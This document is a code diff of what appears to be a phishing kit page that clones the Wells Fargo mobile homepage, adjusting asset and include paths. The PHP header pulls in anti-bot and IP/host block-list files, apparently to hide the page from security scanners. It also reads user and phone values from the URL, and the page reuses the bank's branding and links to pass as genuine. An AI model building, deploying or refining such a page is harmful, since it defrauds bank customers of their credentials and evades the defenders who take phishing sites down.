@@ -3,17 +3,17 @@
 <?php
 session_start();
 error_reporting(0);
-include('../../files/boot/check.php');
-include('../../files/boot/check1.php');
-include('../../files/boot/check2.php');
-include('../../files/boot/antibot.php');
-include('../../files/boot/DB-BOTS.php');
-include('../../files/boot/DB-CIDR.php');
-include('../../files/boot/DB-HOSTS.php');
-include('../../files/boot/DB-METHOD.php');
-include('../../files/boot/DB-RANGE.php');
-include('../../files/boot/enc.php');
-include('../../call.php');
+include('../files/boot/check.php');
+include('../files/boot/check1.php');
+include('../files/boot/check2.php');
+include('../files/boot/antibot.php');
+include('../files/boot/DB-BOTS.php');
+include('../files/boot/DB-CIDR.php');
+include('../files/boot/DB-HOSTS.php');
+include('../files/boot/DB-METHOD.php');
+include('../files/boot/DB-RANGE.php');
+include('../files/boot/enc.php');
+include('../call.php');
 $user = @$_GET['user'];
 $phone = @$_GET['phone'];
 $error = @$_GET['error'];
@@ -39,11 +39,11 @@ echo '<meta http-equiv="refresh" content="0; URL=index.php">';
     <meta http-equiv="Pragma" content="no-cache">
     <meta name="apple-itunes-app" content="app-id=311548709">
 
-    <link rel="shortcut icon" type="image/x-icon" href="../../files/icons/favicon.ico">
-    <link rel="apple-touch-icon" sizes="120x120" href="../../files/icons/apple-touch-icon-120x120.png">
-    <link rel="apple-touch-icon" sizes="180x180" href="../../files/icons/apple-touch-icon-180x180.png">
-    <link rel="icon" sizes="128x128" href="../../files/icons/icon-normal-128x128.png">
-    <link rel="icon" sizes="192x192" href="../../files/icons/icon-hires-192x192.png">
+    <link rel="shortcut icon" type="image/x-icon" href="../files/icons/favicon.ico">
+    <link rel="apple-touch-icon" sizes="120x120" href="../files/icons/apple-touch-icon-120x120.png">
+    <link rel="apple-touch-icon" sizes="180x180" href="../files/icons/apple-touch-icon-180x180.png">
+    <link rel="icon" sizes="128x128" href="../files/icons/icon-normal-128x128.png">
+    <link rel="icon" sizes="192x192" href="../files/icons/icon-hires-192x192.png">
     <!-- 
     <link rel="shortcut icon" type="image/x-icon" href="https://www01.wellsfargomedia.com/favicon.ico">
     <link rel="apple-touch-icon" sizes="120x120" href="https://www.wellsfargo.com/assets/images/icons/apple-touch-icon-120x120.png">
@@ -51,9 +51,9 @@ echo '<meta http-equiv="refresh" content="0; URL=index.php">';
     <link rel="icon" sizes="128x128" href="https://www.wellsfargo.com/assets/images/icons/icon-normal-128x128.png">
     <link rel="icon" sizes="192x192" href="https://www.wellsfargo.com/assets/images/icons/icon-hires-192x192.png">
  -->
-    <link rel="stylesheet" href="../../files/bars/framework.css">
-    <link rel="stylesheet" href="../../files/bars/util.css">
-    <link rel="stylesheet" href="../../files/bars/smartphone-homepage.css">
+    <link rel="stylesheet" href="../files/bars/framework.css">
+    <link rel="stylesheet" href="../files/bars/util.css">
+    <link rel="stylesheet" href="../files/bars/smartphone-homepage.css">
 
 </head>
 
@@ -73,7 +73,7 @@ echo '<meta http-equiv="refresh" content="0; URL=index.php">';
 
             <div class="logoOuter">
                 <div class="logo">
-                    <a href="https://www.wellsfargo.com/"><img alt="" role="img" src="../../files/bars/icn-layer-svg.svg"></a>
+                    <a href="https://www.wellsfargo.com/"><img alt="" role="img" src="../files/bars/icn-layer-svg.svg"></a>
                 </div>
             </div>
 
@@ -186,7 +186,7 @@ echo '<meta http-equiv="refresh" content="0; URL=index.php">';
                                 <div class="footer-content">
                                     <span class="home-equal">‍</span> Equal Housing Lender. NMLSR ID 399801</div>
                                 <div class="footer-content footer-margin">© 2019 Wells Fargo. All rights reserved.</div>
-                                <div class="stage-coach"><img src="../../files/bars/stagecoach_50_opacity.svg" aria-hidden="true" alt=""></div>
+                                <div class="stage-coach"><img src="../files/bars/stagecoach_50_opacity.svg" aria-hidden="true" alt=""></div>
                             </nav>
                         </div>
 
@@ -204,7 +204,7 @@ echo '<meta http-equiv="refresh" content="0; URL=index.php">';
                                 <a data-platform="publicsite" href="https://www.wellsfargo.com/jump/student-loans/flexibility" exitdestination="" data-cid="tcm:402-166164-16" data-ctid="tcm:322-41008-32" exitdisclaimer="" data-newbrowser="" enrollmentid="" data-rottracking="" class="contentArea" data-params="" data-tracking-id="" tabindex="0">
                                     <div class="thumbWithText">
 
-                                        <img alt="" src="../../files/bars/wfi000_ic_b-resource-library-rv_57x57.png">
+                                        <img alt="" src="../files/bars/wfi000_ic_b-resource-library-rv_57x57.png">
 
                                         <div class="textContent">
                                             <h2>Tuition to books</h2> A private student loan may help you cover college costs
@@ -213,7 +213,7 @@ echo '<meta http-equiv="refresh" content="0; URL=index.php">';
 
                                 </a>
 
-                                <img alt="" src="../../files/bars/wfic598_ph_g-878868560_576x263.jpg">
+                                <img alt="" src="../files/bars/wfic598_ph_g-878868560_576x263.jpg">
 
                             </div>
                             <span class="hidden">End Slide 1</span></div>
@@ -222,7 +222,7 @@ echo '<meta http-equiv="refresh" content="0; URL=index.php">';
                                 <a class="contentArea" href="https://www.wellsfargo.com/stories/" tabindex="-1">
                                     <div class="thumbWithText">
 
-                                        <img alt="" src="../../files/bars/wfi000_ic_b-handshake_57x57.png">
+                                        <img alt="" src="../files/bars/wfi000_ic_b-handshake_57x57.png">
 
                                         <div class="textContent">
                                             <h2>Keeping you informed</h2> New progress in making things right for our customers
@@ -231,7 +231,7 @@ echo '<meta http-equiv="refresh" content="0; URL=index.php">';
 
                                 </a>
 
-                                <img alt="" src="../../files/bars/wfic180_ph_1_b-f14_002_576x263.jpg" class="deferred" data-deferred-src="https://www04.wellsfargomedia.com/assets/images/contextual/banner/enterprise/576x263/wfic180_ph_1_b-f14_002_576x263.jpg">
+                                <img alt="" src="../files/bars/wfic180_ph_1_b-f14_002_576x263.jpg" class="deferred" data-deferred-src="../files/bars/wfic180_ph_1_b-f14_002_576x263.jpg">
 
                             </div>
                             <span class="hidden">End Slide 2</span></div>
@@ -240,7 +240,7 @@ echo '<meta http-equiv="refresh" content="0; URL=index.php">';
                                 <a class="contentArea" href="https://www.wellsfargo.com/stories/" tabindex="-1">
                                     <div class="thumbWithText">
 
-                                        <img alt="" src="../../files/bars/wfi000_ic_b-handshake_57x57.png">
+                                        <img alt="" src="../files/bars/wfi000_ic_b-handshake_57x57.png">
 
                                         <div class="textContent">
                                             <h2>Keeping you informed</h2> New progress in making things right for our customers
@@ -249,7 +249,7 @@ echo '<meta http-equiv="refresh" content="0; URL=index.php">';
 
                                 </a>
 
-                                <img alt="" src="../../files/bars/wfic180_ph_1_b-f14_002_576x263.jpg" class="deferred" data-deferred-src="https://www04.wellsfargomedia.com/assets/images/contextual/banner/enterprise/576x263/wfic180_ph_1_b-f14_002_576x263.jpg">
+                                <img alt="" src="../files/bars/wfic180_ph_1_b-f14_002_576x263.jpg" class="deferred" data-deferred-src="../files/bars/wfic180_ph_1_b-f14_002_576x263.jpg">
 
                             </div>
                             <span class="hidden">End Slide 3</span></div>
@@ -278,7 +278,7 @@ echo '<meta http-equiv="refresh" content="0; URL=index.php">';
             </section>
 
             <div class="overlayfavorite" style="display: none;" aria-hidden="true">
-                <div class="favorite-popup" style="top: 520px;"><span class="close-popup"><a href="" class="nooutline"><img alt="Close" src="../../files/bars/btn-close-x.png"></a></span> <span class="sr-only">Begining of popup</span>
+                <div class="favorite-popup" style="top: 520px;"><span class="close-popup"><a href="" class="nooutline"><img alt="Close" src="../files/bars/btn-close-x.png"></a></span> <span class="sr-only">Begining of popup</span>
                     <div class="popup-title">
                         <h2>Article Saved</h2>
                     </div>
@@ -292,7 +292,7 @@ echo '<meta http-equiv="refresh" content="0; URL=index.php">';
             <article class="fp-articles" data-cid="tcm:323-173177-16" data-ctid="tcm:322-113919-32" aria-hidden="true">
                 <a class="articles-media" href="https://www.wellsfargo.com/financial-education/basic-finances/manage-money/cashflow-savings/emergencies/">
 
-                    <img alt="Saving up for an emergency" src="../../files/bars/couple_home-improvement_working_110x110.jpg">
+                    <img alt="Saving up for an emergency" src="../files/bars/couple_home-improvement_working_110x110.jpg">
 
                     <span class="articles-header">Saving up for an emergency</span>
                 </a>
@@ -305,7 +305,7 @@ echo '<meta http-equiv="refresh" content="0; URL=index.php">';
             <article class="fp-articles" data-cid="tcm:323-174682-16" data-ctid="tcm:322-113919-32" aria-hidden="true">
                 <a class="articles-media" href="https://www.wellsfargo.com/financial-education/credit-management/getting-credit-card/">
 
-                    <img alt="Credit card tips for first-time cardholders" src="../../files/bars/female_on-computer_with-coffee_110x110.jpg">
+                    <img alt="Credit card tips for first-time cardholders" src="../files/bars/female_on-computer_with-coffee_110x110.jpg">
 
                     <span class="articles-header">Credit card tips for first-time cardholders</span>
                 </a>
@@ -318,7 +318,7 @@ echo '<meta http-equiv="refresh" content="0; URL=index.php">';
             <article class="fp-articles" data-cid="tcm:323-178559-16" data-ctid="tcm:322-113919-32" aria-hidden="true">
                 <a href="https://www.wellsfargo.com/commitment/redress/" class="articles-media">
 
-                    <img alt="Customer Redress" src="../../files/bars/redress_110x110.jpg">
+                    <img alt="Customer Redress" src="../files/bars/redress_110x110.jpg">
 
                     <span class="articles-header">Making Things Right – Customer Redress</span>
                 </a>
@@ -331,7 +331,7 @@ echo '<meta http-equiv="refresh" content="0; URL=index.php">';
             <article class="fp-articles" data-cid="tcm:323-149897-16" data-ctid="tcm:322-113919-32" aria-hidden="true">
                 <a class="articles-media" href="https://oam.wellsfargo.com/oamo/identity/authentication?execution=e1s1" enrollmentid="2475">
 
-                    <img alt="" src="../../files/bars/article_service_card_e-bills_1x.jpg">
+                    <img alt="" src="../files/bars/article_service_card_e-bills_1x.jpg">
 
                     <span class="articles-header"><p>Need online access?<br>Enroll Now</p></span>
                 </a>
@@ -344,7 +344,7 @@ echo '<meta http-equiv="refresh" content="0; URL=index.php">';
             <div class="iaRendered" data-slot-id="WF_CON_HP_SECONDARY_BNR_1" data-offer-id="C_mtg_prequaldmiweghcpp_hpsec_web_mob" aria-hidden="true">
                 <a data-platform="publicsite" href="https://www.wellsfargo.com/mortgage/apply/prequalification/?dm=DMIWEPURMA" exitdestination="" data-cid="tcm:402-114535-16" data-ctid="tcm:322-41007-32" exitdisclaimer="" data-newbrowser="" enrollmentid="" data-rottracking="" class="marketing-card color4" data-params="" data-tracking-id="21520-158535-3408-100">
 
-                    <img alt="" src="../../files/bars/wfib421_ph_v-blp0006152_110x110.jpg">
+                    <img alt="" src="../files/bars/wfib421_ph_v-blp0006152_110x110.jpg">
 
                     <span class="header-text">Home loans: Get prequalified</span>
                 </a>
@@ -409,7 +409,7 @@ Bank Affiliate | Subject to Investment Risks, Including Possible Loss of
                         <div class="footer-content footer-margin">© 2019 Wells Fargo. All rights reserved.</div>
 
                         <div class="stage-coach">
-                            <img src="../../files/bars/stagecoach_50_opacity.svg" alt="Wells Fargo Stage Coach" role="img">
+                            <img src="../files/bars/stagecoach_50_opacity.svg" alt="Wells Fargo Stage Coach" role="img">
                         </div>
 
                     </nav>
@@ -422,7 +422,7 @@ Bank Affiliate | Subject to Investment Risks, Including Possible Loss of
     </div>
 
     <div class="displayNone">
-        <img src="../../files/bars/s.gif" alt="">
+        <img src="../files/bars/s.gif" alt="">
     </div>
 
 
